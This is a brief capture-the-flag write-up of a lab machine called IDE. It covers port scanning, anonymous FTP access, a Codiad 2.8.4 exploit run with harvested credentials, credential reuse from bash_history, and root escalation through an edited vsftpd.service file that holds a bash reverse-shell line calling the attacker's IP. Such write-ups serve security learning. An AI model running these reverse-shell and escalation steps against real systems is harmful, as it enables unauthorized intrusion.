# CTF Writeup: IDE

---

- Step 1: made nmap -sS -sC -sV -p- target_ip to scan all ports  --> port 21,22,80 & 62337 open 
- Step 2: added ip to /etc/hosts to dns bypass and displayed http page on port 62337 which
isnt exploitable with injections --> cve for codiad 2.8.4 is available, but only if I know the creds
- Step 3: decided to check out ftp server since anonymous login is allowed
- Step 4: there was a dir named ... and a file named - which I get'd on my local machine
- Step 5: retrieved creds john:password and decided to do the 2.8.4 cve 
--> made python2 ka.py http://10.10.123.243:62337/ john password 10.21.156.104 1234 linux
- Step 6: gained rce as john --> went into /drac dir and found creds in bash_history
- Step 7: connected to drac with ssh --> made sudo -l --> runnable executable without root passowrd required
- Step 8: went into vsftpd.service file using nano 
--> and made bash -c 'bash -i >& /dev/udp/10.21.156.104/4444 0>&1
- Step 9: ran script and gained root rce --> retrieved flag 

---

## Key Learnings

- Learned more about hidden directories in ftp --> only . and .. exist
- Slightly improved my knowledge about nmap -p- 
- Further strengthened reverse shell and bash knowledge --> config file had an format issue
where a normal shell couldn't be executed --> made a string out of the shell and put bash -c in front 
and it worked.
